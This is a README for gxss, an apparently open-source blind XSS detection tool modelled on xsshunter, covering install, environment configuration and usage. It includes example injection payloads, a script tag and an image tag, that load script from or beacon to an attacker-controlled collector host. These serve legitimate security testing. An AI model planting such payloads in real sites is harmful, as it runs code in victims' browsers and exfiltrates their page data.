## Blind XSS as a service

**gxss** is a simple tool which serves a javascript payload and allows to identify blind XSS vulnerabilities. It works as [xsshunter](https://github.com/mandatoryprogrammer/xsshunter), but it is a bit simpler to use and configure. Alerts can be sent via Slack or E-Mail. E-Mails will also have an screenshot of the DOM attached.

![gxss](misc/mail.png)

*Note: The javascript payload was taken from [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) and slightly modified*

### Installation

```
go get -u github.com/rverton/gxss
```

### Configuration

Create a file called `.env` or set up your environment to export the following data:
```
PORT=8080
MAIL_SERVER=mail.example.com:25
MAIL_USER=user
MAIL_PASS=pass
MAIL_TO=hello@robinverton.de
MAIL_FROM=gxss@robinverton.de
SLACK_WEBHOOK=https://hooks.slack.com/XYZ
SERVE_URL=localhost:8080
```

The `SERVE_URL` is the public accessible URL of your server.

You can leave the `MAIL_*` or the `SLACK_WEBHOOK` setting blank if you do not want to use it. Find more about how to setup Slack webhooks [here](https://api.slack.com/incoming-webhooks).

### Usage

```
$ gxss
```

You can now use a payload like the following which will load and execute the javascript payload:

```html
<script src=//yourserver.com></script>
```

gxss can also be used as a request bin. Every request matching `//yourserver.com/k{key}` will be alerted to you. Example:

```html
<img src=//yourserver.com/kTARGET1>
```